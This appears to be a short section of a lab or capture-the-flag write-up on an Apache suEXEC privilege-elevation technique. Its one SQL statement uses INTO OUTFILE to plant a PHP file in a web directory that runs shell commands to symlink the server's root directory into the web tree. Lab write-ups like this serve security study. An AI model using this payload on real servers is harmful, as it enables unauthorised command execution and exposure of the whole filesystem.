# Bonus - apache suEXEC 2

[Apache suEXEC privilege elevation](https://www.exploit-db.com/exploits/27397)

We use a similar approach to Writeup 5, but with a different injection type, creating a symlink to the root directory when executed (though it does not grant us root privileges).

``` sql
SELECT "<?php system('ln -sf / tree'); symlink('/', 'tree');?>" INTO OUTFILE '/var/www/forum/templates_c/exec_2.php'
```
